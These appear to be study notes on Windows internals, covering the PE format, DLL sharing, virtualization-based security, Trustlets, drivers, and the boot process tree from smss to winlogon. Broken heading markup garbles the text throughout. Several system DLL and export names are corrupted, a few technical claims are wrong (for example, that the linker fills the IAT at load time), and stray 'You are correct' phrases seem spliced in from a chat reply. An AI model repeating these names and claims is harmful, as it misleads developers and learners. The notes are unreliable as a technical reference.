### Shared Code Sections

### The code section of a DLL (which contains compiled machine instructions) is

read-only and identical across all processes. When a process loads a DLL, the operating system checks whether that DLL is already loaded in physical memory. If it is, Windows maps the existing pages of the DLL into the new process’s virtual address space. No new copy is created in physical RAM; only a new virtual mapping is added. This allows multiple processes to execute the same DLL code while consuming memory for only one physical copy.
### Private Data Sections

### While code sections are shared, data sections (which include writable areas

such as global variables) are not shared.
### Each process receives its own copy of the DLL’s writable data region, ensuring

process isolation and preventing data corruption.
### Efficiency and Performance

By sharing read-only sections: System memory consumption is significantly reduced. Page cache efficiency is improved, as the same pages are reused across processes.
### Application startup times decrease because DLLs already resident in

memory do not need to be reloaded from disk.
### Example

If three processes use kernel32.dll, only one 10 MB copy of the code section resides in RAM. Each process maps that same 10 MB region into its virtual address space, while maintaining separate data regions.
### Program's Executables (PE) are Relocatable. This simply means that they could

### be loaded at different Virtual Addresses each time they are loaded (but cannot

### be relocated after they have been loaded). Relocation happens because an

### executable doesn't exist in isolation—it must co-exist with other executables

### that are loaded in the same address space. Other than the main executable

### (the .exe file you launch when you run a program), every program has a number

### of additional executables loaded into its address space, regardless of whether

### it has DLLs of its own or not. The O.S. loads quite a few DLLs. Because multiple

### executables are loaded into each address space, we have a mixed collection of

executables in each address space that wasn't necessarily planned for.
- RVA (Relative Virtual Address): An offset from the module's base address.
- Base Address: Each module (low-level binary code) is assigned a Base
### Address while being created. The linker assumes that the executable is going to

be loaded at the base address. If it is, no relocation will take place. Else, the module is relocated if the module's base address space is already taken.
### * Relocations are important and are the reason why there are never ABSOLUTE

### addresses in executable headers, only in code. Whenever you have a pointer

inside the executable header, it'll always be in the form of an RVA, which is just
### an offset(+0x00aabb) into that file. When the file is loaded (.exe) and assigned

### a Virtual Address, the loader calculates the real virtual addresses out of RVAs

by adding the module's base address (where it was loaded) to an RVA.
- The executable stores RVA — “offsets” instead of absolute addresses.
When Windows loads the module, it adds the actual base address to the RVA to find the true memory address.
### * Image Sections are needed because different areas of the module image are

### treated differently by the memory manager when a module is loaded. A

### common division is to have a Code Section (e.g., the .text section), containing

### the executable code, and a Data Section, containing the initialized and

uninitialized data. They contain the contents of any initialized variable anywhere in the program.
### * Section Alignment: The memory manager sets the access rights on memory

### pages in the different sections based on the memory settings in the section

### headers. Section alignment shows how sections are aligned when the

### executable is loaded in memory, and file alignment is how sections are aligned

inside the PE file on disk (from memory).
### Imports and Exports: These are the mechanisms that enable the dynamic

linking process of executables described above.
### Consider an executable that references functions in other executables while it's

### being compiled and linked. The compiler and linker have no idea of the actual

address of the imported functions. Only in runtime will this address be known. To solve this problem, the linker creates a special Import Table that lists all the
### functions imported by the current module by their names. The Import Table

contains a list of modules that the module uses and the list of functions called within each of those modules.
### When the module is loaded, the loader loads every module listed in the Import

### Table and goes to find the address of the functions listed in each module. The

### addresses are found by going over the exporting module's Export Table, which

contains the names and RVAs of every exported function.
### When the importing module needs to call into an imported function, the calling

### code typically looks like this: Call [Some Address], where Some Address is a

pointer into the executable's Import Address Table (IAT).
### When the module is linked, the IAT is nothing but a list of empty values. But

### when the module is loaded, the linker resolves each entry in the IAT to point to

### the actual function in the exporting module. This way, when the calling code is

executed, Some Address will point to the actual address of the imported
function.
### PROGRAM EXECUTABLE Directories

### PE Executables contain a list of special optional directories, which are

essentially data structures that describe their contents.
### | Name | Associated Data Structure |

### | Export Directory | IMAGE_EXPORT_DIRECTORY |

### | Import Table | Image_Import_Descriptor |

### | Import Address Table (IAT) | A list of 32-bit pointers |

### | Resource Table | Image_Resource_Directory |

### | Base Relocation Table | Image_Base_Relocation |

### | Debugging Information | Image_Debug_Directory |

### | Thread Local Storage (TLS) Directory | Image_TLS_Directory |

### | Load Configuration Table | Image_Load_Config_Directory |

### | Bound Import Table | Image_Bound_Import_Descriptor |

| Delay Import Descriptor | Image_Delay_Load_Descriptor |
### Exception Handling

### An Exception is a special condition in a program that initializes a special

### function called an Exception Handler. The exception handler either deals with

the exception, corrects the problem, or terminates the program if the exception cannot be resolved.
- Hardware Exceptions: Are generated by the processor.
### * Software Exceptions: Is generated when a program explicitly generates an

### exception in order to report an error/problem. In C++, we can use the throw

### keyword. However, in Windows, the throw keyword is implemented using the

### RaiseException API, which goes down into the kernel but follows a similar code

path as a hardware exception, eventually returning to user mode to notify the program of the exception.
### Structured Exception Handling (SEH)

### The O.S. provides a mechanism for distributing exceptions to applications in an

### organized manner, where each thread is assigned an Exception-Handler list

(that deals with exceptions). This list is stored in the Thread Information Block
### (TIB) data structure, which is available from user mode. The TIB is stored in a

regular, private-allocation, user-mode memory. Virtualization and Security
### Hypervisor and Virtual Machines

### * Virtualization Technologies (Hyper-V, XEN, KVM, VMWARE, VirtualBox,

### QEMU): Employ a Hypervisor, which is a specialized, highly privileged

component that allows for the virtualization and isolation of all resources on the machine, from physical memory to virtual memory, device drivers, etc.
- Containers (Docker): Run in containers and provide fully isolated virtual
### environments solely for running a single application stack or framework,

### leveraging OS-level virtualization features (like namespaces and cgroups)

rather than full hardware virtualization.
### Virtualization-Based Security (VBS)

### VBS is a security architecture that enhances the processor's natural privilege-

### based separation (User/Kernel) via the introduction of Virtual Trust Levels

(VTLs), isolating access to memory, hardware, and the processor.
### * VTL 0/VTL 1: VBS capabilities introduce a new VTL 1 layer, which contains its

own Secure Kernel (SecureKernel.exe) running in privileged processor mode. VTL 0 is the regular Windows OS.
- Secure Kernel / Proxy Kernel: The VTL 1 Secure Kernel is its own secure
binary.
### * Isolated User Mode (IUM): An environment that restricts the allowed system

### calls that regular User-Mode DLLs can make. It's a framework that adds special

### secure system calls that can execute only under VTL 1. These calls are exposed

through internal system libraries like Jumapal.dll and Jumplibrary.dll.
- SLAT (Second Level Address Translation): Hardware I/O MMU (Input/Output
### Memory Management Unit). The Secure Kernel uses SLAT to intercept and

control execution of memory locations. It's the basis for security features like Credential Guard and Device Guard.
### * I/O MMU: Effectively virtualizes memory access for devices; this can be used

### to prevent device drivers from using Direct Memory Access (DMA) to directly

access the Hypervisor's or Secure Kernel's physical regions of memory.
### * Trustlets: Specially signed binaries with a unique ID and signature allowed to

### run/execute in VTL 1 by the Secure Kernel. The Secure Kernel has hard-coded

### knowledge of which Trustlets have been created, so it's impossible to create

new Trustlets without access to the Secure Kernel. Executing Trustlets cannot be patched.
- HyperGuard: Protects Kernel-related data structures and code using Hyper-V
virtualization.
- Credential Guard: Prevents unauthorized access to domain credentials and
related application data structures.
- Device Guard: Provides a stronger security baseline for applications.
### * Host Guardian Service (HGS): Employs Virtual TPM (Trusted Platform

Module) to protect the SHIELD Fabric VM from the infrastructure or host.
### * UEFI (Unified Extensible Firmware Interface): A secure boot implementation

### guaranteeing strong requirements around the signature quality of the boot-

### related software (firmware) must be present. This process guarantees that

Windows Components (Operating System) loads securely from the beginning of boot.
### Terminal Services

### * Terminal Services (Remote Desktop, mstsc.exe, Microsoft Terminal Services /

### Fast User Switching) refers to the support in Windows for multiple interactive

sessions on a single system. A remote user can establish a connection/session on another machine, \log in, and run apps on the server. The server transmits
audio, video, and clipboard data and the client transmits user input back to the server.
### Kernel Objects

- A Kernel Object is a single, run-time instance of a statically defined object
type.
### * An Object Type comprises a system-defined data type, functions that

operate on instances of the data type, and a set of object attributes.
- An Object Attribute is a field of data in an object that partially defines its
state.
### * An object of Type: PROCESS would have attributes like Process ID,

Scheduling Priority, and a pointer to an Access Token.
- Object Methods: Means for manipulating objects, usually to read or change
Object Attributes.
### * Object Manager: (Kernel Component) accomplishes the following OS tasks:

### Reference Counting (Allows system to recognize when an object is no longer in

### use \rightarrow memory space is automatically deallocated), Sharing

Resources, and Protecting Resources from unauthorized access.
### * Not all data structures in Windows are objects (e.g., many internal data

structures are not exposed to the Object Manager). Security and Access Control
### Core Security Capabilities

- Privileged Access Control: Allows administrator access to protected objects.
### * Discretionary / Mandatory Access Control (DAC/MAC): Protection for all

shareable system objects in DLLs, files, threads, processes, etc.
- Need-to-Know: A method by which owners or creators of objects grant/deny
access to others.
### * Security Context: Access Token on the subject (the thread/process) is

### combined with the Access Control List (ACL) on the object (the resource) to

determine permission to perform the requested operation.
### * Attribute-Based / Dynamic Access Control (ABAC/DAC): (Introduced in

### Windows Server 2012 and Windows 8) Infuses access control using more than

just groups. It identifies required attributes/claims that grant access to a resource. Windows Architecture -> Executive and Kernel
### Windows achieves portability across hardware architectures by using a Layered

Design and by using the C Language. Windows is a Symmetric Multi-Processing
## (Smp) O.S.

### * SMP has no master processor. The O.S./Kernel threads as well as User

### threads can be scheduled to run on any processor. All the processors share just

### one memory space. This model contrasts the Asymmetric Multi-Processing

### (ASMP), in which the O.S. typically selects one processor to execute O.S./

Kernel-wide code, while others run only in User Mode.
### Multi-Processing Features

- The ability to run O.S. Code on any available processor and on multiple
processors at the same time.
### * Multiple threads of execution within a single process, each of which can

execute simultaneously on different processors.
### * Fine-grained synchronization within the kernel, device drivers, and server

processes, which allows more components to run concurrently on multiple processors.
### * Mechanisms that facilitate the efficient implementation of multi-threaded

server processes that can scale well on multiprocessor systems.
### Executive Components

The Executive is the upper layer of NTOSKRNL.EXE. The Kernel is the lower
layer.
### The Executive contains Base OS Services and is the internal component that

exports the documented OS API to the Object Manager. | Executive Component | Role | |---|---| | Configuration Manager | Responsible for implementing and managing the
### system registry. |

### | Process Manager | Creates and terminates processes and threads. |

| Security Reference Monitor (SRM) | Enforces security policies on the local
### computer. |

### | I/O Manager | Implements device-dependent I/O and is responsible for

### dispatching to the appropriate device drivers. |

### | Memory Manager | Implements Virtual Memory, a scheme providing a large

### private address space for each process. |

| Power Manager | Coordinates power events and generates power management
### I/O notifications to device drivers. |

### | Cache Manager | Improves performance of file-based I/O by causing recently

### referenced disk data to reside in memory. |

### | Plug & Play Manager | Determines what drivers are required to support a

### particular device and loads those, retaining the hardware resource

### requirements for each device during enumeration. |

### Executive Support Functions: The Executive contains four main groups of

### support functions that are used by the Executive Components: Object Manager,

Run Time Library Functions, Executive Support Routines, and Asynchronous Local Procedure Call (ALPC).
### * ALPC: Used as a transport for Remote Procedure Call (RPC). Windows

implements an industry-standard communication facility for client and server processes across a network.
### Kernel Components

### The Kernel provides fundamental mechanisms used by the Executive

components and low-level hardware architecture.
### Kernel Objects : Help the kernel control CPU processing and support the

### creation of Executive objects. Most Executive-level Objects encapsulate one or

more kernel objects, incorporating their defined attributes.
### Control Objects, Async Procedural Call (APC) Object, Deferred Procedure Call

(DPC) Object, Interrupt Object, Dispatcher Object.
### Kernel Processor Control Region (KPCR) : A data structure used to store

### processor-specific data (e.g., the processor's Interrupt Dispatch Table, Task

State Segment, and Global Descriptor Table).
### Kernel Process Control Block (KPRCB) : An embedded data structure inside the

### KPCR containing: Scheduling Info, Dispatcher Database, DPC Queue, Time

Accounting Info, Cache Size, and Processor Stats. I/O Manager : Manages device-independent I/O operations and is responsible
for dispatching I/O requests to the appropriate device drivers. Device Drivers : Includes hardware device drivers, translating user I/O function calls into specific hardware requests.
### HAL (Hardware Abstraction Layer) : Abstracts and isolates the kernel, drivers,

and Executive from platform-specific hardware differences (e.g., differences in motherboards).
## Hardware Abstraction Layer (Hal)

### The HAL is a loadable kernel-mode module that provides a low-level interface

### to the hardware platform on which Windows is running. It hides hardware-

### dependent details, multi-processor mechanisms, and any functions that are

both architecture-specific and machine-dependent.
### * Rather than accessing hardware directly, Windows Internal components and

### user-written device drivers maintain portability by calling the HAL.DLL Routines

whenever they need platform-dependent information.
### * All x64 and ARM machines have the same motherboard configuration; their

processors require ACPI's and APIC support.
### * Windows supports modules known as HAL Extensions (additional DLLs on

### disk) that the boot loader may load if specific hardware requiring them is

needed (usually through ACPI and Registry-based configuration).
### Input & Output (I/O)

I/O channels implemented with Windows can be divided into two groups: kernel-level and high-level.
- The low-level layer is the I/O system responsible for communicating with the
hardware, and so on.
- The higher-level layer is the Win32 Subsystem responsible for implementing
the GUI and for processing User Input.
### I/O System and Device Drivers

### The I/O system is a combination of kernel components that manage the device

### drivers running in the system and the communication between applications and

### device drivers. Device drivers register with the I/O System, which enables

### applications to communicate with them and make generic or device-specific

### requests to or from the device. The I/O System is responsible for relaying such

requests from the application to the device drivers that are responsible for performing the operation.
### The I/O system is layered, which means that for each device, there can be

multiple device drivers stacked on top of each other.
## Device Drivers

### Device Drivers are loadable kernel-mode modules that interface between the I/

### O Manager and the relevant hardware. Drivers enable Windows to interact with

### various types of hardware, including displays, storage, smartcard readers, and

human input devices. They are also used to monitor network traffic and file I/O
### by antivirus software (and by Sysinternals

utilities such as Procmon and Procexp!). And, of course, they are also used by malware, particularly rootkits.
### They run in Kernel Mode in one of three contexts:

- As a result of an Interrupt, in the context of whatever thread is current.
- In the context of the User Thread that initiated an I/O function.
- In the context of a kernel-mode system thread.
### * Device drivers in Windows don't manipulate Hardware directly. Rather, they

call functions in the HAL.DLL to interface.
### * Drivers written in C/C++ use HAL routines, are source-code portable across

the CPU architectures supported by Windows.
### Types of Drivers

### * Hardware Device Drivers: These use the HAL to manipulate hardware to write

output/retrieve input from a device/network.
### * File System Drivers (FSDs): These accept file-oriented I/O requests and

translate them into I/O Requests bound for a device.
- File System Filter Drivers: These include drivers that perform Disk Mirroring /
### Encryption / Scans and intercept I/O Requests and perform some value-added

processing before passing the I/O Request to the next layer.
### * Network Redirectors & Servers: These are file system drivers that transmit/

receive file system I/O Requests to a device on a Network.
- Protocol Drivers: These implement a networking protocol (e.g., TCP/IP,
NetBIOS, IPX/SPX).
- Kernel Streaming Filter Drivers: These are chained together to perform signal
processing on data streams.
### * Software Drivers: These are kernel modules that perform operations that can

only be done in kernel mode on behalf of a user-mode application. WDK (Windows Driver Kit): Aimed at developers of device drivers. WSDK (Windows Software Development Kit): Aimed at developers of Windows- supported software/applications.
### Windows Driver Model (WDM) Perspective

According to the Windows Driver Model (WDM) perspective, there are three
### kinds of drivers:

- Bus Driver: Services a Bus Controller, adapter, bridge, or any device that has
child devices.
- Function Driver: Is the main driver that provides the operational interface for
its device.
- Filter Driver: Is used to add functionality to a device or existing driver, or to
also modify I/O Requests/Responses.
- It's often used to fix hardware that provides incorrect information about its
resource requirements.
### * A Bus Driver is concerned with reporting the devices on its bus to the PnP

### Manager (an Executive Component that determines which drivers are required

to support a particular device—Function Drivers—and loads those drivers).
### * Lower-level filter drivers modify the behavior of device hardware, while

upper-level filter drivers usually provide added-value features for a device (e.g., enforce additional security checks on a file).
### Windows Driver Foundation (WDF)

The Windows Driver Foundation (WDF) simplifies Windows driver development by providing two frameworks:
## * Kernel-Mode Driver Framework (Kmdf)

## * User-Mode Driver Framework (Umdf)

- KMDF provides a simple interface to WDM and hides its complexity from the
Driver Writer/Engineer.
### * UMDF runs each user-mode driver in what is essentially a user-mode service,

and uses ALPC to communicate to a kernel-mode wrapper driver that provides actual access to the hardware.
### Universal Windows Drivers (UWD)

### * UWD refers to the ability to write device drivers once that share APIs and

Device Driver Interfaces (DDIs) provided by Windows to a common core.
### * They are binary compatible for a specific CPU architecture (x86, x64, ARM)

and can be used as-is on a variety of form factors.
- UWD can use KMDF, UMDF 2.0, or WinRT as their driver model.
### * Examine installed system drivers using the System Information Tool

(Msinfo32.exe) and expanding the Software Environment \rightarrow System Drivers node.
### * Device Drivers and Windows Service processes are both defined in

\rightarrow HKLM\SYSTEM\CurrentControlSet\Services.
### * Looking at the list of functions in NTDLL/HAL/NTOSKRNL gives you a list of

### all the system services that Windows provides to user-mode subsystem DLLs

versus the subset that each subsystem exposes.
### System Processes and Boot Structure

### | Process Name | Process ID (PID) | Notes |

### | Idle Process | 0 | (1 thread per CPU) to account for idle CPU time. |

| System Process | 4 | Contains the majority of kernel-mode system threads and
### handles core Executive services. |

| Secure System Process | N/A | Contains the address space of the Secure
### Kernel (VTL 1), if running. |

| Memory Compression Process | N/A | Contains the compressed working set of
### user-mode processes. |

| Session Manager (smss.exe) | N/A | Process that creates sessions and the
### initial processes for service hosts. |

### | Logon Process (winlogon.exe) | N/A | Handles interactive user logon/logoff. |

| Local Security Auth Server (lsass.exe) | N/A | Local Security Authority Server
## (Lsa). |

| Local Security Auth Server (lsaiso.exe) | N/A | Isolated LSA Trustlet (if Credential Guard is enabled). |
### To understand how these processes are related, it's helpful to view the process

### tree (parent/child relationship between processes). Viewing which process

### created which helps understand where each process is from. To understand

### this correctly, perform a BOOT TRACE, by enabling boot logging in Process

Monitor. Using Process Monitor enables you to see processes that have since terminated.
### Non-Standard System Processes

### * Secure System Process: The Secure System process and the Memory

### Compression process aren't running a real user-mode Image from disk. It is

technically home to VTL 1 Secure Kernel address space, handles & threads.
### Because scheduling, Object, Process & Memory management are owned by the

### VTL 0 kernel, no actual entities are associated with this process. Its only real

use is to provide a visual indicator to users that VBS is active.
### * Memory Compression Process: Its primary job is to host the threads

### responsible for compressing & decompressing memory pages. It efficiently

### manages the working set and reduces the need to page data out to Disk. It

### uses its user-mode address space to store the compressed pages of memory

that correspond to Standby Memory extracted from other processes.
### System Process (PID 4)

- The System process is the home for a special kind of thread that runs only in
kernel-mode—a "System Thread".
### * System threads don't have a user-process address space and hence must

allocate any dynamic storage from OS Memory heaps, such as the Paged/Non- Paged pool.
- They are created by the PsCreateSystemThread function.
### * Windows, as well as wrapper device drivers, create system threads during

system initialization (WinInit) to perform operations that require thread creation attributes (e.g., priority, synchronization objects, issuing and waiting for I/O, or other objects, or polling a device (polling is more efficient than Interrupt-driven
## I/O)).

### * By default, system threads are owned by the System process, but a device

### driver can create a system thread in any process (e.g., the WMDs subsystem

### device driver (Win32k.sys) creates a thread (system thread) inside the

### Canonical Display Driver part of the WMDs Subsystem process so that it can

easily access data in the user-mode address space of that process).
### * During troubleshooting, it's advisable to map the execution of individual

system threads back to the driver or even to the subroutine that contains the code executed.
### MiniMAL Processes (Memory Compression / Secure System Process)

### The Minimal Flag is set on certain system processes (like the Memory

Compression Process and the Secure System Process if VBS is enabled). No User-Address Space will be set up, therefore no Process
Environment Block ($\text{PEB}$) or related structure will exist.
### No executable Image is associated with their execution, as they

aren't running a real User-Mode Image from disk. No $\text{NTDLL}$ will be mapped into the process; no Section Objects will be tied to the process.
### This flag is set in the $\text{EPROCESS}$ Flags, causing all threads to

become minimal threads, and as such, no $\text{TEB}$ (Thread Environment Block) will be created.
### Pico Processes

Pico Provider Control allows the emulation of the behavior of a completely different Operating System kernel.
### To support the existence of Pico Processes on the system, a provider must

### be present and registered with the kernel. On Windows systems with the

### optional WSL (Windows Subsystem for Linux) component enabled, a core

### driver called Lxss.sys serves as a stub driver (provider) until another driver,

Lxcore.sys, loads a bit later and takes over the pico provider responsibilities.
### When a Pico Provider calls the registration API, it receives a set of function

### pointers to create and manage pico processes. The provider can now create

### fully custom processes and threads for which it controls the critical starting

### state, segment registers, and associated data. This alone would not allow

### the ability to emulate another Operating System. A second set of function

pointers is, therefore, transmitted from the provider to the kernel, which serves
### as callbacks whenever certain activities or interactions will be performed

### by a pico thread or process. These include:

When the Pico Thread makes a call using a syscall function. Whenever an exception is raised from a pico thread. Page Faults. When Event Tracing for Windows is requesting the User-Mode stack trace of a pico process. Request for pico process termination.
### It now becomes clear that with such unparalleled access to any possible

### user-kernel transition and interactions between a Pico Process/Thread and

### the O.S., can be fully encapsulated by a Pico Provider to wrap a completely

### different kernel implementation than that of Windows. Pico Providers are

### custom-written Kernel Modules that implement callbacks to respond to the

### list of possible events that a pico process can cause. This is how WSL is

capable of running unmodified Linux $\text{ELF}$ binaries in User-Mode.
### TRUSTLETS (Secure System Process)

### Trustlets are regular Windows Portable Executables ($\text{PE}$) files that

### contain some IUM-specific properties and can import only a limited set of

### Windows System DLLs due to the restricted number of system calls that are

available to them. The IUM-specific system DLL is jumbase.dll, which
provides the base IUM system API. This library ends up calling into jumaal.dll (the VTL 1 version of NTDLL.DLL). They are signed with a certificate that contains the Isolated User Mode EKU ($ \text{1.3.6.1.4.1.311.10.3.37}$).
### Trustlet Policy Metadata includes various options for configuring how

### "accessible" the Trustlet will be from VTL 0. This is described by a structure

present at the _JumPolicyMetadata export and contains a Version Number.
### This serves as metadata for the Secure Kernel to implement policy settings

### around permitting $\text{VTL 0}$ (Kernel) access to the Trustlet (e.g., allowing

debugging, crash dumps, Event Tracing, and other capability support).
### Trustlet Attributes are used to authenticate that the caller truly wants to

### create a Trustlet, as well as to verify that the Trustlet the caller thinks is

### executing is actually the Trustlet being executed. This is done by

embedding a Trustlet Identifier in the attribute, which must match the Trustlet ID contained in the metadata.
### The benefits of running as a Trustlet include access to privileged and

### protected Secure System Calls offered by the Secure Kernel. As the Secure

### Kernel attempts to minimize its attack surface and exposure, it provides only

### a subset of all of the System Calls that a normal kernel ($\text{VTL 0}$)

### application can use. These system calls are the strict minimum necessary for

compatibility with the system calls that Trustlets can use, as well as the specific
### services required to support the RPC Runtime Library ($\text{Rpcrt.dll}$)

and ETW Tracing, including the following groups: Thread API Process Info API Synchronization Object API Advanced Local Procedure Call (ALPC) API System Information API Virtual Memory Allocation API Section API Trace Control API
### Exception API

Secure processes can be identified in the kernel debugger by their names, Secure PID, and
### Session Manager (SMSS.EXE)

### The Session Manager (smss.exe) is the first user-mode process created in the

### system, launched by the kernel-mode system thread that performs the final

phase of initialization of the Executive & KERNEL.
### * When started, smss.exe checks whether it's the first instance or an instance

### of itself launched to create a session. If command-line arguments are present,

### it was therefore not the first instance. This permits creating concurrent

### sessions, enhancing logon performance on Terminal Server Systems where

multiple users can log on at the same time.
- Once a session finalizes initialization, the copy of smss.exe terminates.
- The Master smss.exe marks the Initialization Process (by its initial thread) as
critical (an exit for any reason leads to a crash).
### * It initializes a thread pool to handle ALPC Commands and creates an ALPC

port named LsaAlpcPort to receive commands.
### * It initializes a local copy of the NUMA topology of the system and creates the

### initial process environment block based off various values in the

### HKLM\System\CurrentControlSet\Control\Session Manager key, which it loads

from the registry. It creates system-wide environment variables and initializes the rest of the Registry.
### * It creates an Unnamed Section Object that is shared by child processes (like

### Csrss.exe) for info exchanged with smss. The handles to this Section are

passed to child processes via Handle Inheritance.
- It opens Known DLL maps and maps them as Permanent Sections.
- It creates the smss.exe instance to initialize Session 0 (non-interactive).
### * It creates the smss.exe instance to initialize Session 1 (interactive), if

configured in the Registry (it can create additional smss.exe instances for extra interactive sessions to prepare itself in advance for future logons).
- It creates the subsystem processes for the session and an instance of
Winlogon (interactive session).
### * The master smss.exe then waits forever on the handle to the Session 0

instance of Csrss, which is marked "Critical". Therefore, if Csrss terminates, the system crashes.
### * The intermediate smss.exe process then exits, leaving the subsystem &

Winlogon with the master smss.exe as their parent/owner.
### Windows Initialization Process (WININIT.EXE)

### The Windows Initialization Process (wininit.exe) also marks itself and its main

thread as Critical, thereby treating certain errors as fatal.
### * It creates an event named GLOBAL\FIRST LOGON CHECK for use by

Winlogon processes to detect if a logon is the first one.
### * It creates a Winlogon Log Off event in the Based Named Objects object

manager's directory to be used by Winlogon. This event is signaled (set) when a logoff operation starts.
- It increases its own base Priority to High.
### * Unless configured otherwise with a NoDebugThread Registry Value, it

### creates a periodic timer queue which will break into any user-mode process at

a time specified by the kernel debugger, thus enabling Remote Kernel Debugging for user-mode applications.
- It sets the machine name in the environment variable ComputerName and
updates related info.
- It sets the default profile environment variables (UserProfile, AllUsersProfile,
Public, ProgramData).
- It creates the Temp directory by expanding to %SystemRoot%\Temp.
- It sets up font loading and the Desktop Window Manager (DWM) for Session
0 (if it's an interactive session).
- It creates the Initial Terminal, composed of a Window Station (WinSta0) and
two Desktops (Winlogon's and Default).
- It initializes the LSA machine encryption key.
- It creates the Service Control Manager (SCM / services.exe) and starts the
LSA Subsystem Service (lsass.exe).
### * If Credential Guard is enabled, it launches the Isolated LSA Trustlet

(lsaiso.exe), which requires querying the VBS provisioning key from UEFI.
- If setup is pending (the first boot during a fresh install or an update to a new
build), it launches the setup program and waits forever for a request for system shutdown.
### Service Control Manager (SERVICES.EXE)

### Windows services run in noninteractive, user-mode processes that can be

### configured to start independently of any user logging on, and that are

controlled through a standard interface with the Service Control Manager.
### Multiple services can be configured to share a single process. A common

example of this can be seen in Svchost.exe (Host Process for Windows
### Services), which is specifically

### designed to host multiple services implemented in separate DLLs. Services are

configured in the subkeys of HKLM\System\CurrentControlSet\Services.
- Services can refer to a server process or a device driver.
### * Services are like UNIX Daemon processes in that they can be configured to

start automatically at system boot time without requiring an interactive logon.
### They can also be started manually by running the Service Administrator Tool

(SC.EXE) or by calling the Windows StartService function.
### * Services do not interact with the logged-on user. Most services run in special

### service accounts (e.g., System or Local Service), while others run with the

same security context as the logged-in user account.
### * The SCM is a special system process that is responsible for starting,

stopping, and interacting with service processes and programs.
### * Service programs are Windows images that call special Windows functions to

### interact with the SCM, registering the service's successful startup, responding

to state change requests, pausing/shutting down the service, etc.
S e r v i c e s a r e d e f i n e d i n t h e r e g i s t r y u n d e r HKLM\System\CurrentControlSet\Services.
### * A service has three names: the process name you see running, the internal

### name in the Registry, and the Display name in the Services Admin tool, plus a

description field that further details what the service does.
### * There isn't a 1-to-1 mapping between service processes running services, as

### some services share processes (using svchost.exe). In the registry, the Type

value under the service's key indicates whether the service runs in its own process or with others.
### Logon Process (WINLOGON.EXE)

### The Winlogon tab displays entries that hook into Winlogon.exe, which manages

### the Windows interactive-logon user interface. Introduced in Windows Vista, the

### Credential Provider interface manages the user authentication interface. Today,

### Windows includes many credential providers that handle password, PIN,

picture-password, smartcard, and biometric logon.
### The Winlogon process handles interactive user logons & logoffs. It is notified

### that a User Logon is required when the user enters the Secure Attention

Sequence (SAS) keystroke combination: \text{Ctrl}+\text{Alt}+\text{Delete}.
### * The Identification & Authentication aspects of the logon process are

### implemented through DLLs called CREDENTIAL PROVIDERS, which implement

authentication interfaces (e.g., password, smartcard, or biometrics).
### * Because Winlogon is also a critical system process on which the system

### depends, the Credential Providers and the User Interface to display logon

dialog boxes run inside a child process of Winlogon—LogonUI.exe (Child).
- When Winlogon detects the SAS, it launches this child process, which
initializes the Credential Providers.
- Winlogon can also load additional Network Providers DLLs that are required
to perform secondary authentication.
### * After the username/password (or biometric info) has been captured, they are

### sent to the Local Security Authority Services process \rightarrow LSASS.EXE,

### which then calls the appropriate authentication package (implemented as a

### DLL) to perform the actual verification (e.g., checking whether a password

matches what is stored in the Active Directory or the SAM).
### * If Credential Guard is enabled and this is a domain logon, LSASS.EXE will

### communicate with the Isolated LSA Trustlet (LSAISO.EXE) to obtain the

machine key required to verify the legitimacy of the authentication request.
### * Upon successful authentication, LSASS.EXE calls a function in the SRM

(NtCreateToken) to generate an Access Token Object that contains the user's security profile.
- This Access Token is used by Winlogon to create the initial process(es) in the
user's session.
### * The initial process(es) are stored in the Userinit registry value under the

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows Registry key.
### * Userinit.exe performs some initialization of the user environment (e.g.,

loading samples, network connections). It looks in the registry at the Shell value
### and creates a process for running the system-defined shell, Explorer.exe, then

Userinit.exe exits. This is why Explorer.exe is often shown with no parent; it is technically the grandchild of Winlogon.exe.
### (Client/Server Runtime Subsystem Services - CSRSS.exe)

### Windows Boot Sequence and Process Hierarchy

### The Windows boot sequence transitions from low-level firmware and boot

loaders to the complex world of the Operating System's process structure.
### The System process starts an instance of Smss.exe (the Session Manager),

### which remains running until system shutdown. That Smss.exe launches two new

### instances of Smss.exe, one in session 0 and one in session 1, which create

### processes in their respective sessions. Both of these instances end up exiting

### before a user logs on, so the initial Smss.exe always appears not to have child

processes. The instance of Smss.exe in session 0 starts an instance of
### Csrss.exe (the “client-server runtime” Windows subsystem) in session 0 and

### Wininit.exe. Wininit.exe starts Services.exe (the Service Control Manager

### process) and Lsass.exe (the Local Security Authority subsystem). In session 1,

### Smss.exe starts a new instance of Csrss.exe and Winlogon.exe. Winlogon starts

### LogonUI.exe to prompt the interactive user for credentials, and then it starts

### Userinit.exe (which starts Explorer) after the user has authenticated. Both

### LogonUI and Userinit typically exit before the shell initializes and theuser can

start Procexp. Most services are descendants of Services.exe; Services.exe does not host any services itself.
### The Kernel and Initial System Processes (The Foundation)

### When the kernel (NTOSKRNL.EXE) is loaded and initialized by the boot loader,

it creates the absolute minimum processes needed to manage the system.
- System and Idle Processes: The very first two "processes" are created by the
### kernel itself:

- Idle Process (PID 0): This is not a true process; it's the accounting structure
used to track unused CPU time on each core.
- System Process (PID 4): This is the host for all kernel-mode system threads.
It operates exclusively in Kernel Mode and handles fundamental OS services.
### * Memory Compression Process: You are correct; this process is visible very

### early on. Its primary job is to host the threads responsible for compressing and

### decompressing memory pages, efficiently managing the Working Set and

reducing the need to page data out to disk.
### * Registry Initialization (The "System" Process Role): The System Process

### (specifically, kernel threads running inside it) is responsible for loading and

### initializing the Configuration Manager. The Configuration Manager then reads

### the critical Registry Hives (like the SYSTEM hive) from disk into memory,

making the system configuration available to the rest of the OS.
### Session Manager and Subsystem Initialization

### The System Process then launches the first user-mode process, the Session

Manager Subsystem (smss.exe), which is the orchestrator for the entire User Session environment.
### * SMSS (Session Manager Subsystem - The Orchestrator): smss.exe is

responsible for creating subsequent user sessions and launching the initial processes within them.
### * It performs initial setup: including creating the Paged and Non-Paged

memory pools and loading the KnownDLLs list.
### * It launches the critical subsystem processes:

### * CSRSS.EXE (Client-Server Runtime Subsystem): This is the User-Mode

### part of the Win32 subsystem. It manages critical functions like window and

thread creation, but its role has diminished over time (e.g., console windows are now handled by conhost.exe).
### * WININIT.EXE (Windows Initialization): This process is essential for the non-

interactive side of the system, primarily launching core services.
### * WINLOGON.EXE: You are correct that the Session Manager starts

winlogon.exe. This process is responsible for the secure attention sequence
### (\text{Ctrl}+\text{Alt}+\text{Delete}) and handling user logon/logoff events,

making it the gateway to the user interface.
### Services and User Environment Setup

The boot trace correctly moves to wininit.exe, which focuses on getting the system services online.
### * WININIT (The Service Starter): wininit.exe does two crucial things:

